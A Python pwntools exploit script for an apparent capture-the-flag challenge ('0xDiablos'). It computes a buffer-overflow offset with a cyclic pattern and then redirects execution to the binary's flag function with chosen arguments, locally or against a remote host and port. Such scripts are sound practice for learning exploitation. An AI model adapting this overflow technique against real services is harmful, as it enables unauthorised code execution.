from pwn import *

import os

BINARY = './vuln'


'''
Exploit beginning
'''
log.warn("IMPORTANT: Make sure your binary has been patched and is using the correct version of libc and ld loader!")

log.info("For remote: %s HOST PORT" % sys.argv[0])
log.info("For debug: %s -d\n" % sys.argv[0])

if len(sys.argv) > 2:
	p = remote(sys.argv[1], int(sys.argv[2]))

else:

	# Debug
	if len(sys.argv) > 1 and sys.argv[1] == '-d':
		p = gdb.debug(BINARY, '''
			b vuln
			b main
			b flag
			continue
		''')

	else:
		p = process(BINARY)


######################
#
# START
#
######################

######################################
## Getting padding
######################################
log.info("Getting padding for BOF...")

p2 = process(BINARY)
p2.sendline(cyclic(200))
p2.wait()

core = p2.corefile


PADDING = int(str(cyclic_find(core.eip)))

log.info("Padding: " + str(PADDING))

PADDING = cyclic(PADDING)
os.system("rm ./core*")


elf = ELF(BINARY, checksec=False) # Extract data from binary
FLAG_PLT = elf.symbols['flag']

log.info('flag function @ {}'.format(hex(FLAG_PLT)))

p.recvuntil(b'You know who are 0xDiablos: \n')

p.sendline(PADDING + p32(FLAG_PLT) + p32(0xc0ded00d) + p32(0xdeadbeef) + p32(0xc0ded00d))

p.recvline()

log.success('Flag: ' + str(p.recv()))

